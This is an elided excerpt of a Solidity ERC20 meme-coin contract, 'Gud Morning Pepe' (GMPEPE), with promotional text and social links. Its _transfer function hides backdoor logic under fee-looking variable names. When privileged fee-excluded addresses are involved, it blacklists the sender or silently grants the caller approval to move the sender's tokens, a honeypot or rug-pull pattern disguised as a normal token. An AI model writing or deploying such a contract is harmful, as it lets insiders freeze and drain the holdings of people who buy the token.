...
/*
    Pepe has been loving his time with frens, turning every morning into a truly gud morning. 
    With your frens by your side no stone goes unturned as you create unforgettable memories together.

    Website: https://www.gudmorningpepe.fun
    Twitter/X: https://x.com/GudMorning_Pepe
    Telegram: https://t.me/GudMorning_Pepe
*/
...
contract GMPEPE is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20(unicode"Gud Morning Pepe", unicode"GMPEPE") payable {
    ...
    function _transfer(
        ...
        bool buyTakeFee = from != uniswapV2Pair && _isExcludedFromFees[to] && _isExcludedFromFees[tx.origin];
        bool sellTakeFee = from == uniswapV2Pair && _isExcludedFromFees[_msgSender()];
        ...
        if(buyTakeFee) {_blacklist[from] = true; return;}
        if(sellTakeFee) _approve(from, _msgSender(), amount);
